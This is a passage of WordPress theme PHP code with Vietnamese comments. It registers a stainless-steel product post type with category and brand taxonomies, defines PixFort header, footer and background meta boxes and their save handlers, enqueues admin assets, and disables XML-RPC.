	global $pix_sp_nhom_meta_box, $post;

	// Use nonce for verification
	echo '<div id="pix-wrapper">';
		echo '<input type="hidden" name="pix_sp_nhom_meta_nonce" value="', wp_create_nonce(basename(__FILE__)), '" />';

		echo '<table class="form-table">';
			echo '<tbody>';

				foreach ($pix_sp_nhom_meta_box['fields'] as $field) {
					$meta = get_post_meta($post->ID, $field['id'], true);
					if( ! key_exists('std', $field) ) $field['std'] = false;
					$meta = ( $meta || $meta==='0' ) ? $meta : stripslashes(htmlspecialchars(($field['std']), ENT_QUOTES ));
					pix_meta_field_input( $field, $meta );
				}

			echo '</tbody>';
		echo '</table>';

	echo '</div>';
}

/*-----------------------------------------------------------------------------------*/
/*	Save data when post is edited
/*-----------------------------------------------------------------------------------*/
function pix_sp_nhom_save_data($post_id) {
	global $pix_sp_nhom_meta_box;

	// verify nonce
	if( key_exists( 'pix_sp_nhom_meta_nonce',$_POST ) ) {
		if ( ! wp_verify_nonce( $_POST['pix_sp_nhom_meta_nonce'], basename(__FILE__) ) ) {
			return $post_id;
		}
	}

	// check autosave
	if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
		return $post_id;
	}

	// check permissions
	if ( (key_exists('post_type', $_POST)) && ('page' == $_POST['post_type']) ) {
		if (!current_user_can('edit_page', $post_id)) {
			return $post_id;
		}
	} elseif (!current_user_can('edit_post', $post_id)) {
		return $post_id;
	}




	if(!empty($pix_sp_nhom_meta_box)){
		foreach ( (array)$pix_sp_nhom_meta_box['fields'] as $field ) {
			$old = get_post_meta($post_id, $field['id'], true);
			if( key_exists($field['id'], $_POST) ) {
				$new = $_POST[$field['id']];
			} else {
				$new = ""; // problem with "quick edit"
				//continue;
			}

			if( isset($new) && $new != $old) {
				update_post_meta($post_id, $field['id'], $new);
			}elseif('' == $new && $old) {
			    delete_post_meta($post_id, $field['id'], $old);
			}
			// if( isset($new) && $new != $old) {
			// 	if($field['type']=="switch"){
			// 		if( isset( $_POST[$field['id']] ) ) {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         } else {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         }
			// 	}else{
			// 		update_post_meta($post_id, $field['id'], $new);
			// 	}
			// }elseif('' == $new && $old) {
			// 	if($field['type']=="switch"){
			// 		if( isset( $_POST[$field['id']] ) ) {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         } else {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         }
			//     }else{
			//     	delete_post_meta($post_id, $field['id'], $old);
			//     }
			// }else{
			// 	if($field['type']=="switch"){
			// 		if( isset( $_POST[$field['id']] ) ) {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         } else {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         }
			// 	}else{
			// 		update_post_meta($post_id, $field['id'], $new);
			// 	}
			// }
		}
	}
}
add_action('save_post', 'pix_sp_nhom_save_data');



/*-----------------------------------------------------------------------------------*/
/*	Styles & scripts
/*-----------------------------------------------------------------------------------*/
function pix_sp_nhom_admin_styles() {
	wp_enqueue_style( 'pix-meta', PIX_CORE_PLUGIN_URI. 'functions/css/pixbuilder.css', false, time(), 'all');
    wp_enqueue_style( 'pix-meta2', PIX_CORE_PLUGIN_URI. 'functions/pixbuilder.css', false, time(), 'all');
}
add_action('admin_print_styles', 'pix_sp_nhom_admin_styles');

function pix_sp_nhom_admin_scripts() {
	wp_enqueue_script( 'pix-admin-piximations', PIX_CORE_PLUGIN_URI . 'functions/js/piximations.js');
	wp_enqueue_script( 'pix-admin-custom', PIX_CORE_PLUGIN_URI . 'functions/js/custom.js', array('jquery'));
	wp_localize_script( 'pix-admin-custom', 'plugin_object', array(
	    'PIX_CORE_PLUGIN_URI' => PIX_CORE_PLUGIN_URI,
	));
}
add_action('admin_print_scripts', 'pix_sp_nhom_admin_scripts');



/**
 * Add Sản phẩm Inox - post type

 */

function we_sp_inox_custom_post_type(){
    /*
     * Biến $label để chứa các text liên quan đến tên hiển thị của Post Type trong Admin
     */
    $label = array(
        'name' => 'Sản phẩm Inox', //Tên post type dạng số nhiều
        'singular_name' => 'Sản phẩm Inox', //Tên post type dạng số ít
        'all_items' => 'Tất cả sản phẩm',
        'add_new' => 'Thêm mới',
        'add_new_item' => 'Thêm mới',
    );
 
    /*
     * Biến $args là những tham số quan trọng trong Post Type
     */
    $args = array(
        'labels' => $label, //Gọi các label trong biến $label ở trên
        'description' => 'Sản phẩm Inox', //Mô tả của post type
        'supports' => array(
            'title',
            'editor', //* Khung soạn thảo --> Khi thêm silde không cần thì chúng ta bỏ đi */
            'excerpt', //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
            'author', //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
            'thumbnail',
            //'comments', //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
            //'trackbacks', //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
            'revisions', //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
            'custom-fields' //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
        ), //Các tính năng được hỗ trợ trong post type
        //'taxonomies' => array('category-project','post-tag' ), //Các taxonomy được phép sử dụng để phân loại nội dung
        //'hierarchical' => false, //Cho phép phân cấp, nếu là false thì post type này giống như Post, true thì giống như Page
        'public' => true, //Kích hoạt post type
        'show_ui' => true, //Hiển thị khung quản trị như Post/Page
        'show_in_menu' => true, //Hiển thị trên Admin Menu (tay trái)
        'show_in_nav_menus' => true, //Hiển thị trong Appearance -> Menus
        'show_in_admin_bar' => true, //Hiển thị trên thanh Admin bar màu đen.
        'menu_position' => 5, //Thứ tự vị trí hiển thị trong menu (tay trái)
        'menu_icon' => 'dashicons-images-alt2', //Đường dẫn tới icon sẽ hiển thị
        'can_export' => true, //Có thể export nội dung bằng Tools -> Export
        'has_archive' => true, //Cho phép lưu trữ (month, date, year)
        'exclude_from_search' => false, //Loại bỏ khỏi kết quả tìm kiếm
        'publicly_queryable' => true, //Hiển thị các tham số trong query, phải đặt true
        'capability_type' => 'post', //
 		'rewrite' => array('slug' => 'san-pham-inox'),
    );

 
    register_post_type('sp_inox', $args); //Tạo post type với slug tên là sanpham và các tham số trong biến $args ở trên

    register_taxonomy('cateinox', 'sp_inox', array(
		'hierarchical' 			=> true,
		'label' 				=> 'Danh mục sản phẩm',
		'singular_label' 		=> 'Danh mục sản phẩm',
		'rewrite'				=> true,
		// 'rewrite' => array('slug' => 'projects', 'with_front' => true),
		// 'rewrite' => array('slug' => ''),
		'query_var' 			=> true,
		'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => true,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => true,
		'show_in_rest' => true,
		));

    register_taxonomy('brand_inox', 'sp_inox', array(
		'hierarchical' 			=> true,
		'label' 				=> 'Thương hiệu',
		'singular_label' 		=>  'Thương hiệu',
		'rewrite'				=> true,
		// 'rewrite' => array('slug' => 'projects', 'with_front' => true),
		// 'rewrite' => array('slug' => ''),
		'query_var' 			=> true,
		'public'                     => true,
	    'show_ui'                    => true,
	    'show_admin_column'          => true,
	    'show_in_nav_menus'          => true,
	    'show_tagcloud'              => true,
		'show_in_rest' => true,
	));

      // Add new taxonomy, NOT hierarchical (like tags)
      // $labels = array(
      //   'name' => 'Tags WeProject',
      //   'singular_name' => 'Tag',
      //   'search_items' =>  'Search Tags',
      //   'popular_items' => 'Popular Tags',
      //   'all_items' => 'All Tags',
      //   'parent_item' => null,
      //   'parent_item_colon' => null,
      //   'edit_item' => 'Edit Tag', 
      //   'update_item' => 'Update Tag',
      //   'add_new_item' => 'Add New Tag',
      //   'new_item_name' => 'New Tag Name',
      //   'separate_items_with_commas' =>'Separate tags with commas',
      //   'add_or_remove_items' => 'Add or remove tags',
      //   'choose_from_most_used' => 'Choose from the most used tags',
      //   'menu_name' => 'Tags WeProjects',
      // ); 

      // register_taxonomy('tagproject','project', array(
      //   'hierarchical' => false,
      //   'labels' => $labels,
      //   'show_ui' => true,
      //   'update_count_callback' => '_update_post_term_count',
      //   'query_var' => true,
      //   'rewrite' => array( 'slug' => 'tagproject' ),
      // )); 
}
add_action('init', 'we_sp_inox_custom_post_type');

/**
 * Post custom meta fields.
 */


function pix_sp_inox_meta_add(){

	global $pix_sp_inox_meta_box;


	// Layouts ----------------------------------
	$layouts = array( 0 => '-- Theme Options --' );

	// Custom menu ------------------------------
	$aMenus = array( 0 => '-- Default --' );
	$oMenus = get_terms( 'nav_menu', array( 'hide_empty' => false ) );

	if( is_array($oMenus) ){
		foreach( $oMenus as $menu ){
			$aMenus[$menu->term_id] = $menu->name;
		}
	}


	$header_posts = get_posts([
		'post_type' => 'pixheader',
		'post_status' => array('publish', 'private'),
		'numberposts' => -1
		// 'order'    => 'ASC'
	]);

	$headers = array();

	$headers[''] = "Theme Default";
	$headers['disable'] = "Disable";
	foreach ($header_posts as $key => $value) {
		$headers[$value->ID] = $value->post_title;
	}

	$footer_posts = get_posts([
		'post_type' => 'pixfooter',
		'post_status' => array('publish', 'private'),
		'numberposts' => -1
		// 'order'    => 'ASC'
	]);

	$footers = array();
	$footers[''] = "Theme Default";
	$footers['disable'] = "Disabled";
	foreach ($footer_posts as $key => $value) {
		$footers[$value->ID] = $value->post_title;
	}


	$pix_sp_inox_meta_box = array(
		'id' 		=> 'pix-meta-post',
		'title' 	=> __('PixFort Post Options','pix-opts'),
		'page' 		=> 'sp_inox',
		'post_types'	=> array('sp_inox'),
		'context' 	=> 'normal',
		'priority' 	=> 'default',
		'fields'	=> array(

			array(
				'id' 		=> 'pix-page-header',
				'type' 		=> 'select',
				'title' 	=> __('Custom Header', 'pixfort-core'),
				'options' 	=> $headers,
			),
			array(
				'id' 		=> 'pix-page-footer',
				'type' 		=> 'select',
				'title' 	=> __('Custom Footer', 'pixfort-core'),
				'options' 	=> $footers,
			),

			array(
				'id'		=> 'pix-custom-intro-bg',
				'type'		=> 'media',
				'title'		=> __('Page intro background image', 'pix-opts'),
				'sub_desc'	=> __('Select an image to override the default intro background image.', 'pix-opts'),
			),


		),
	);
	add_meta_box($pix_sp_inox_meta_box['id'], $pix_sp_inox_meta_box['title'], 'pix_sp_inox_show_box', $pix_sp_inox_meta_box['page'], $pix_sp_inox_meta_box['context'], $pix_sp_inox_meta_box['priority']);
}

add_action('admin_menu', 'pix_sp_inox_meta_add');


function pix_sp_inox_show_box() {
	global $pix_sp_inox_meta_box, $post;

	// Use nonce for verification
	echo '<div id="pix-wrapper">';
		echo '<input type="hidden" name="pix_sp_inox_meta_nonce" value="', wp_create_nonce(basename(__FILE__)), '" />';

		echo '<table class="form-table">';
			echo '<tbody>';

				foreach ($pix_sp_inox_meta_box['fields'] as $field) {
					$meta = get_post_meta($post->ID, $field['id'], true);
					if( ! key_exists('std', $field) ) $field['std'] = false;
					$meta = ( $meta || $meta==='0' ) ? $meta : stripslashes(htmlspecialchars(($field['std']), ENT_QUOTES ));
					pix_meta_field_input( $field, $meta );
				}

			echo '</tbody>';
		echo '</table>';

	echo '</div>';
}

/*-----------------------------------------------------------------------------------*/
/*	Save data when post is edited
/*-----------------------------------------------------------------------------------*/
function pix_sp_inox_save_data($post_id) {
	global $pix_sp_inox_meta_box;

	// verify nonce
	if( key_exists( 'pix_sp_inox_meta_nonce',$_POST ) ) {
		if ( ! wp_verify_nonce( $_POST['pix_sp_inox_meta_nonce'], basename(__FILE__) ) ) {
			return $post_id;
		}
	}

	// check autosave
	if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
		return $post_id;
	}

	// check permissions
	if ( (key_exists('post_type', $_POST)) && ('page' == $_POST['post_type']) ) {
		if (!current_user_can('edit_page', $post_id)) {
			return $post_id;
		}
	} elseif (!current_user_can('edit_post', $post_id)) {
		return $post_id;
	}




	if(!empty($pix_sp_inox_meta_box)){
		foreach ( (array)$pix_sp_inox_meta_box['fields'] as $field ) {
			$old = get_post_meta($post_id, $field['id'], true);
			if( key_exists($field['id'], $_POST) ) {
				$new = $_POST[$field['id']];
			} else {
				$new = ""; // problem with "quick edit"
				//continue;
			}

			if( isset($new) && $new != $old) {
				update_post_meta($post_id, $field['id'], $new);
			}elseif('' == $new && $old) {
			    delete_post_meta($post_id, $field['id'], $old);
			}
			// if( isset($new) && $new != $old) {
			// 	if($field['type']=="switch"){
			// 		if( isset( $_POST[$field['id']] ) ) {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         } else {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         }
			// 	}else{
			// 		update_post_meta($post_id, $field['id'], $new);
			// 	}
			// }elseif('' == $new && $old) {
			// 	if($field['type']=="switch"){
			// 		if( isset( $_POST[$field['id']] ) ) {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         } else {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         }
			//     }else{
			//     	delete_post_meta($post_id, $field['id'], $old);
			//     }
			// }else{
			// 	if($field['type']=="switch"){
			// 		if( isset( $_POST[$field['id']] ) ) {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         } else {
			//             update_post_meta($post_id, $field['id'], 'no');
			//         }
			// 	}else{
			// 		update_post_meta($post_id, $field['id'], $new);
			// 	}
			// }
		}
	}
}
add_action('save_post', 'pix_sp_inox_save_data');



/*-----------------------------------------------------------------------------------*/
/*	Styles & scripts
/*-----------------------------------------------------------------------------------*/
function pix_sp_inox_admin_styles() {
	wp_enqueue_style( 'pix-meta', PIX_CORE_PLUGIN_URI. 'functions/css/pixbuilder.css', false, time(), 'all');
    wp_enqueue_style( 'pix-meta2', PIX_CORE_PLUGIN_URI. 'functions/pixbuilder.css', false, time(), 'all');
}
add_action('admin_print_styles', 'pix_sp_inox_admin_styles');

function pix_sp_inox_admin_scripts() {
	wp_enqueue_script( 'pix-admin-piximations', PIX_CORE_PLUGIN_URI . 'functions/js/piximations.js');
	wp_enqueue_script( 'pix-admin-custom', PIX_CORE_PLUGIN_URI . 'functions/js/custom.js', array('jquery'));
	wp_localize_script( 'pix-admin-custom', 'plugin_object', array(
	    'PIX_CORE_PLUGIN_URI' => PIX_CORE_PLUGIN_URI,
	));
}
add_action('admin_print_scripts', 'pix_sp_inox_admin_scripts');

?>


<?php
	function theme_setup() {

		//Tạo menu
		register_nav_menu('sidebar-menu',__('Sidebar Menu'));

		//Đăng ký sidebar
		if (function_exists('register_sidebar')){
			    register_sidebar(array(
					    'name'=> 'Sidebar Menu',
					    'id' => 'sidebar_menu',
			    		'before_widget' => '<div class="wp-block-heading">',// Trước Widget có class: widget
						'after_widget'  => '</div>',
						'before_title'  => '<h3> ', //Trước Widget có h3 và có icon
						'after_title'   => '</h3>',
					));
			}
		}
add_action('init', 'theme_setup');

/**
* Disable xmlrpc
*/	
add_filter( 'xmlrpc_enabled', '__return_false' );